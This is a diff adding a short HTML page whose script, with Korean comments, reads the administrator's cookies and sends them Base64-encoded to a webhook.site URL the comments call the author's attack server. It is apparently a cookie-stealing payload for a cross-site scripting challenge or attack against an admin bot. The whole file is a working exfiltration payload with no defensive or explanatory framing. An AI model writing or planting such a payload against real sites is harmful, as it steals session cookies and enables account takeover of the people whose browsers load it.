@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // 1. 관리자의 쿠키를 가져옵니다.
+        const cookie = document.cookie;
+        
+        // 2. 나의 공격용 서버(Webhook 등)로 쿠키 데이터를 보냅니다.
+        // btoa()를 사용해 Base64로 인코딩하면 특수문자로 인한 오류를 방지할 수 있습니다.
+        fetch('https://webhook.site/99e5c1f7-0a95-42a9-ba62-8e5b77f1f215?data=' + btoa(cookie));
+    </script>
+</body>
+</html>
